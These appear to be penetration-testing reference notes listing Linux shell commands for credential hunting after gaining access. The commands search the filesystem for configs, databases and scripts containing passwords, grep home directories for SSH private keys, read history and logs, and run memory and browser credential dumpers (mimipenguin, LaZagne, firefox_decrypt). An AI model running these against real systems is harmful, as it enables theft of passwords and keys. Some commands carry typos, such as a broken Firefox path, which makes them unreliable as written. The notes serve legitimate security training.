### Resources that can provide us with credentials
- Configs
- Database
- Notes
- Scripts
- Source codes
- Cronjobs
- SSH Keys
- Logs
- Command-Line History
- Cache
- In-memory Processing
- Browser stored credtentials

### Configuration Files
```bash
# Find all configuration files in the system
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
- Credentials in Configuration Files
```bash
# output to a file
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### Databases
```bash
# Find all db files in the systems
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Notes
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Cronjobs
```bash
cat /etc/crontab
ls -la /etc/cron.*/
```

### SSH Private Keys
```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

### SSH Public Keys
```bash
grep -rnm "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

### History
```bash
tail -n5 /home/*/.bash*
```

### Logs
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Memory and Cache
- Memory - Mimipenguin
```bash 
sudo python3 mimipenguin.py

sudo bash mimipengui.sh
```

- Memory - LaZagne
```bash
sudo python3 laZagne.py all
```

### Browsers
- Firefox Stored Credentials
```bash
ls -l .mozilla/firefox/ | grep default

cat .mozilla/fire/$FILE.default*/logins.json | jq .
```

- Decrypte Firefox credentials
```bash
python3 firefox_decrypt.py
```

- Browsers - LaZagne
```bash
python3 laZagne.py browsers
```